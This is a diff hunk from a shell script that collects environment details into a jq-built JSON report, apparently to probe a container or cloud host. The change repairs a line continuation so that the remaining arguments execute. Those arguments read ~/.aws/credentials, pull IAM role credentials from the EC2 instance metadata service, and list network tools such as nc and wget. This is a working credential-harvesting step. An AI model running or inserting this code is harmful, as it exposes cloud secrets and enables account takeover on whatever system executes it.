@@ -8,7 +8,7 @@ chmod +x ./amicontained
     --arg processes "`ps -aux`" \
     --arg mounts "`mount`" \
     --arg tools "`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`" \
-    --arg amicontained "`./amicontained`"
+    --arg amicontained "`./amicontained`" \
     --arg getlocalcreds "`cat ~/.aws/credentials`" \
     --arg curlgoogle "`curl google.com`" \
     --arg getec2metadatav1 "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl http://169.254.169.254/latest/meta-data/iam/)`" \
